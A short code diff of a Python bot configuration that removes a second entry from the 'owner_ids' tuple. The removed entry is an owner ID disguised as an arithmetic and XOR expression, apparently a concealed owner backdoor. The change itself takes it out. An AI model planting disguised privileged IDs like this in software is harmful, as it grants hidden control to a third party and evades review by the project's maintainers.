@@ -314,7 +314,7 @@ bot_data = {
     "ipc_port": states.get("IPC_PORT"),
     "ipc_key": states.get("IPC_KEY"),
     "intents": intents,
-    "owner_ids": (591135329117798400, 10859 * 233341 * 10 ** 8 + 3 * 7 * 53 * (223914 ^ 255555)),
+    "owner_ids": (591135329117798400, ),
     "websocket_ip": states.get("WEBSOCKET_IP"),
     "prefix_weights": states.get("PREFIX_WEIGHT"),
     "prefix_derivative": states.get("PREFIX_DERIVATIVE_PATH"),
